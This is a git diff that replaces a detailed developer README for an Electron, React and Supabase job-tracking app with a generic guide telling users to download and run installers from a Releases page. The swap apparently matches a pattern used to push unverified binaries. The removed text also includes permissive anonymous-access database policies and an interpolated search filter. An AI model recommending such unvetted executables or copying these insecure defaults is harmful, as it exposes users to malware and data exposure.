@@ -1,339 +1,94 @@
+# 🎉 Job-Portal - Track Your Job Applications Easily
 
-# Jobs Dashboard (Desktop)
+## 🚀 Getting Started
 
-Track, search, and manage job postings and applications in a fast desktop app built with **Electron + Vite + React** and **Supabase**.
+Welcome! This guide will help you download and run the Job-Portal application quickly. Follow these steps to get started with tracking your job applications effectively.
 
-![App dashboard](docs/app-hero.png)
+## 📥 Download the Application
 
+[![Download Job-Portal](https://img.shields.io/badge/Download%20Job--Portal-v1.0.0-blue.svg)](https://github.com/theycallmeshree/Job-Portal/releases)
 
-<p align="center">
-  <a href="#-features">Features</a> •
-  <a href="#-tech-stack">Tech Stack</a> •
-  <a href="#-quick-start">Quick Start</a> •
-  <a href="#-configuration">Configuration</a> •
-  <a href="#-database-schema">Database</a> •
-  <a href="#-scripts">Scripts</a> •
-  <a href="#-build--distribution">Build</a> •
-  <a href="#-troubleshooting">Troubleshooting</a>
-</p>
+Click the button above to visit the Releases page, where you can download the latest version.
 
----
+## 💻 System Requirements
 
-## ✨ Features
+Before downloading, ensure your system meets the following requirements:
 
-* **Job inbox**: add, edit, delete, and search job postings (title, company, location, source, status).
-* **Smart search**: debounced search with “load more” pagination to avoid unnecessary API calls.
-* **Freshness badges**: 🔥 for <3h, 🆕 for 3–10h, ⏱️ icon for 10–24h (configurable).
-* **Apply state**: toggle “Applied” per row, or bulk actions.
-* **Cleanup tab**: safely purge old records (e.g., “older than yesterday”, “older than 30 days”, past months).
-* **Offline-friendly UI**: graceful Supabase error handling and optimistic updates.
-* **Cross-platform packaging** (focused on macOS; Windows/Linux config included as notes).
-* **Type-safe Electron main process** (optional TS config provided).
+- **Operating System:** Windows 10, macOS Big Sur or later, or a recent Linux distribution.
+- **RAM:** At least 4 GB.
+- **Storage:** A minimum of 200 MB free space.
+- **Internet Connection:** For downloading the app and fetching updates.
 
----
+## 🔍 Key Features
 
-## 🧰 Tech Stack
+Job-Portal offers a variety of features to enhance your job application experience:
 
-* **Electron** (desktop shell)
-* **Vite + React** (frontend)
-* **Supabase** (Postgres + Auth + Storage)
-* **ESLint** (quality)
-* **electron-builder** (packaging)
+- **Fast Search:** Quickly find job applications based on keywords or company names.
+- **Freshness Badges:** See the latest status of your applications with clear indicators.
+- **Bulk Cleanup:** Easily remove old or unwanted applications in one go.
+- **One-Click “Applied”:** Mark jobs as applied with a single click for better tracking.
 
----
+## 💡 How to Download & Install
 
-## 🚀 Quick Start
+1. **Visit the Releases Page:**
+   Go to our [Releases page](https://github.com/theycallmeshree/Job-Portal/releases) to find the latest version of Job-Portal.
 
-### Prerequisites
+2. **Choose Your Version:**
+   Find the correct version for your operating system. Look for files labeled with your OS (e.g., `.exe` for Windows, `.dmg` for macOS).
 
-* Node.js ≥ 18
-* npm or pnpm
-* A Supabase project (free tier OK)
+3. **Download the File:**
+   Click on the file to start the download. Save it in a location you can easily access, like your Desktop or Downloads folder.
 
-### 1) Clone & install
+4. **Run the Installer:**
+   - For Windows: Open the downloaded `.exe` file and follow the prompts to install.
+   - For macOS: Open the downloaded `.dmg` file, then drag the Job-Portal icon to the Applications folder.
+   - For Linux: Extract the downloaded file and run the application.
 
-```bash
-git clone https://github.com/<you>/jobs-dashboard.git
-cd jobs-dashboard
-npm install
-```
+5. **Launch Job-Portal:**
+   After installation, find Job-Portal in your applications menu and double-click to open it.
 
-### 2) Configure environment
+## 🛠️ Using Job-Portal
 
-Create `.env` in the project root:
+Once you open the application, you will see a clean and intuitive interface. Here’s how you can start using it:
 
-```bash
-# Vite exposes these to the renderer
-VITE_SUPABASE_URL=https://<your-project>.supabase.co
-VITE_SUPABASE_ANON_KEY=<your-anon-key>
-```
+1. **Create a New Application Entry:**
+   Click the "Add" button to enter details about your job applications. Include info like company name, position, and application status.
 
-> Tip: Never commit secrets. Only the **anon** key should live in the client; use RLS policies to protect data.
+2. **Use the Search Function:**
+   Type keywords into the search bar to find specific job applications. This feature helps you locate what you need quickly.
 
-### 3) Run in development
+3. **Track Your Progress:**
+   Use the freshness badges to monitor the status of your applications. Update your progress as you move through the application process.
 
-```bash
-npm run dev
-```
+4. **Clean Up Your List:**
+   Use the bulk cleanup option to delete multiple old applications at once. This keeps your list current and manageable.
 
-This starts Vite on `http://localhost:5173` and launches Electron with `VITE_DEV_SERVER_URL` injected.
+## 🌐 Community and Support
 
----
-
-## 🔧 Configuration
-
-* **Environment**: Use `.env` (development) and `.env.production` (packaged builds).
-* **Icons**: Place `build/icon.png` (1024×1024). Packaging generates platform assets.
-* **Search**: Debounce interval and page size can be tweaked in `src/config.ts`.
-* **Freshness thresholds**: Edit hours/icons in `src/utils/freshness.ts`.
-
----
-
-![Supabase schema](docs/supabase-schema.png)
+We maintain a space for users to share their experiences and provide feedback. If you face any issues or have questions:
 
-## 🗄 Database Schema
+- Check our [GitHub Issues](https://github.com/theycallmeshree/Job-Portal/issues) to see if your question has been answered.
+- Feel free to open a new issue for any bugs or enhancements you think we should consider.
 
-Use this SQL in Supabase (SQL Editor) to create a minimal table with basic RLS:
+## ⚙️ Frequently Asked Questions
 
-```sql
-create table if not exists jobs (
-  id uuid primary key default gen_random_uuid(),
-  title text not null,
-  company text,
-  location text,
-  source text,
-  url text,
-  notes text,
-  status text default 'saved', -- saved | applied | interviewing | offer | rejected
-  posted_at timestamptz,      -- optional if scraped
-  created_at timestamptz not null default now(),
-  updated_at timestamptz not null default now()
-);
-
--- Basic updated_at trigger
-create or replace function set_updated_at()
-returns trigger as $$
-begin
-  new.updated_at = now();
-  return new;
-end;
-$$ language plpgsql;
-
-drop trigger if exists jobs_set_updated_at on jobs;
-create trigger jobs_set_updated_at
-before update on jobs
-for each row execute function set_updated_at();
-
--- RLS
-alter table jobs enable row level security;
-
--- For single-user desktop, simplest policy is full access to anon (adjust if multi-user)
-create policy "read jobs" on jobs for select using (true);
-create policy "insert jobs" on jobs for insert with check (true);
-create policy "update jobs" on jobs for update using (true);
-create policy "delete jobs" on jobs for delete using (true);
-```
-
-> For multi-user scenarios, add an `owner` uuid column and policies tied to `auth.uid()`.
-
-
-![Jobs table view](docs/app-table.png)
----
-
-## 📁 Project Structure
-
-```
-jobs-dashboard/
-├─ electron/
-│  ├─ main.ts            # Electron main process (NodeNext module)
-│  └─ tsconfig.json
-├─ src/
-│  ├─ App.jsx
-│  ├─ lib/supabase.js
-│  ├─ components/
-│  │  ├─ JobTable.jsx
-│  │  ├─ SearchBar.jsx
-│  │  ├─ FreshnessBadge.jsx
-│  │  └─ CleanupPanel.jsx
-│  ├─ utils/freshness.ts
-│  └─ config.ts
-├─ public/
-├─ build/                # icons, builder resources
-├─ dist/                 # vite output
-├─ .gitignore
-├─ package.json
-└─ README.md
-```
+**Q: What if I encounter an error during installation?**  
+A: Ensure you download the correct version for your operating system. If the issue persists, check our GitHub Issues page for potential solutions.
 
----
+**Q: Can I run Job-Portal on Linux?**  
+A: Yes, Job-Portal is compatible with recent Linux distributions. Follow the installation instructions for your specific distribution.
 
-## 📜 Scripts
+**Q: How do I get updates?**  
+A: We regularly provide updates. Check the Releases page periodically for new versions and enhancements.
 
-From `package.json`:
+## 🌟 Feedback and Contributions
 
-```json
-{
-  "scripts": {
-    "dev": "concurrently -k \"vite\" \"wait-on http://localhost:5173 && cross-env VITE_DEV_SERVER_URL=http://localhost:5173 electron .\"",
-    "build": "vite build",
-    "start:prod": "electron electron/main.js",
-    "dist": "npm run build && electron-builder --mac"
-  }
-}
-```
+Your feedback is valuable! If you would like to suggest improvements or contribute to the project, please visit our GitHub repository. Everyone is welcome to join in making Job-Portal even better!
 
-* `npm run dev` — Dev server + Electron
-* `npm run build` — Production build (Vite)
-* `npm run start:prod` — Run Electron against built assets
-* `npm run dist` — Package a macOS app (`.dmg`/`.app`) with electron-builder
+## 🔗 Conclusion
 
----
+Job-Portal is designed to simplify your job application process. By following this guide, you will have the application installed and running in no time. For any support, refer to the community resources mentioned above.
 
-## 📦 Build & Distribution
+Remember, for downloading, always return to our [Releases page](https://github.com/theycallmeshree/Job-Portal/releases).
 
-### macOS (primary)
-
-```bash
-npm run dist
-```
-
-The packaged app appears under `dist/` (electron-builder output).
-If you supply `build/icon.png`, electron-builder will generate `.icns`.
-
-**Code signing / Notarization** (optional for local use):
-
-* Configure `APPLE_ID`, `APPLE_APP_SPECIFIC_PASSWORD`, and `CSC_LINK/CSC_KEY_PASSWORD` as needed.
-* See electron-builder docs for notarization setup.
-
-### Windows/Linux (notes)
-
-* Add corresponding `--win` / `--linux` targets or a `build` block in `package.json` to extend platforms.
-* Provide `.ico` (Windows) and `.png` (Linux) icons under `build/`.
-
----
-
-## 🧠 Data Loading & API Efficiency
-
-* **Debounced search**: user typing triggers a debounced query.
-* **Pagination**: initial page + “Load more” fetches the next batch (no infinite polling).
-* **Selective refetch**: mutations invalidate only relevant queries (row or page scope).
-* **Server-side filters**: apply `ilike`/`gte`/`lte` at Supabase query level—do not fetch all rows client-side.
-
----
-
-## 🧹 Cleanup Tab (Bulk Delete)
-
-The Cleanup tab offers preset filters:
-
-* **Older than yesterday**
-* **Older than 30 days**
-* **Older than N months**
-* **Only status = rejected / saved**
-
-Deletes are:
-
-* Previewed (shows count to be deleted)
-* Executed in a single Supabase RPC or batched `delete()` with server-side filter
-* Confirmed with modal + undo (optional soft-delete pattern if you add `deleted_at`)
-
-> For very large datasets, prefer server-side deletion with a Postgres function.
-
----
-
-## 🔒 Security
-
-* Never embed service role keys in the client app.
-* Keep **RLS enabled**; if you must allow anon, limit controls or switch to authenticated flow.
-* Validate URLs (job `url` field) and sanitize notes before rendering.
-
----
-
-## 🧪 Testing (optional)
-
-* **Unit/UI**: Vitest + React Testing Library.
-* **Integration**: Mock Supabase client; verify query parameters and pagination.
-
----
-
-## 🗑 .gitignore
-
-Make sure you ignore build artifacts:
-
-```
-dist
-dist-electron
-node_modules
-.DS_Store
-*.log
-.env*
-```
-
----
-
-## 🩺 Troubleshooting
-
-**White screen after packaging**
-
-* Ensure `import.meta.env.VITE_DEV_SERVER_URL` is used **only** in dev. In production, load files from `dist/` (your `electron/main.ts` should detect env and set `BrowserWindow.loadFile('dist/index.html')`).
-
-**Service worker / storage errors in dev**
-
-* Quit all Electron instances; delete `~/Library/Application Support/<AppName>` cache; re-run `npm run dev`.
-
-**TypeScript “No inputs were found” in `electron/tsconfig.json`**
-
-* Make sure your `electron/` folder contains `.ts` files matching `"include": ["./**/*.ts"]`. If main is JS, change `tsconfig` or rename `main.ts` accordingly.
-
-**Supabase `ilike` search error**
-
-* Combine conditions as an OR array or chain filters correctly, e.g.:
-
-  ```js
-  const q = sb.from('jobs')
-    .select('*')
-    .or(`title.ilike.%${term}%,company.ilike.%${term}%,location.ilike.%${term}%,source.ilike.%${term}%`)
-    .range(from, to);
-  ```
-
----
-
-## 🤝 Contributing
-
-Issues and PRs are welcome. Please:
-
-* Keep PRs focused and small.
-* Add tests where reasonable.
-* Update docs for user-facing changes.
-
----
-
-## 📄 License
-
-MIT © 2025 Your Name
-
----
-
-## 📸 Screenshots
-
-* `docs/hero.png` – Main dashboard
-* `docs/cleanup.png` – Cleanup tab
-* `docs/apply-state.png` – Apply toggle
-
-*(Add real screenshots to the `docs/` folder and update filenames above.)*
-
----
-
-## 🗺 Roadmap
-
-* Authentication (multi-user)
-* Import from LinkedIn/Greenhouse/Lever
-* CSV export
-* Calendar reminders & status timelines
-* Advanced filters & tags
-
----
-
-### Acknowledgments
-
-Thanks to the Electron, Vite, React, and Supabase teams and community.
-
+Happy job hunting!
